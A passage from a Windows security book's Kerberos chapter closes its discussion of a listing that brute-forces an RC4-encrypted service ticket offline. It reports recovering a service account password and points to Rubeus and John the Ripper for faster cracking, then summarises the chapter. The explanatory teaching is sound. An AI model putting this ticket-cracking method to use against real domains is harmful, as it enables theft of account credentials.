Listing 14-35: Decrypting the ticket with a set of passwords

We can check if the ticket was decrypted by querying its Encrypted property ❶ . If it was decrypted, we then print the password to the console. In this case, we find that the password for the sqlserver user is DBPassword — probably not the most secure option! Note that this example script isn't very efficient or fast. It's made easier by the ticket being encrypted with the RC4 encryption algorithm; you could apply the same technique to AES, but the brute-forcing attempt will take longer, as AES key derivation is more complex.

For better performance, you're better off using another tool, such as Rubeus (https://github.com/GhostPack/Rubeus), originally developed by Will Schroeder at SpecterOps. This tool can get the ticket and use it to generate a hash that you can feed to a fast password-cracking tool such as John the Ripper (https://www.openwall.com/john/).

## Wrapping Up

This chapter contained an in-depth discussion of Kerberos, the protocol used for Windows domain authentication since Windows 2000. We examined the key distribution center implemented on the Windows domain controller, which holds the list of keys associated with all users and computers on a network, and saw how Kerberos uses these keys (typically derived from the account password) to authenticate tickets, which can then authenticate to services on the network.

496    Chapter 14

---

To support complex authentication scenarios, Kerberos allows for the delegation of credentials. We discussed this topic at length, including both constrained and unconstrained delegation as well as the associated Service for User mechanisms. We finished the chapter with a description of userto-user authentication, which allows for two users to authenticate to each other without needing to register an SPN with the domain.

The next (and final) chapter will describe some additional network


authentication protocols as well as going into more depth on how the SSPI


APIs are used.

---



---

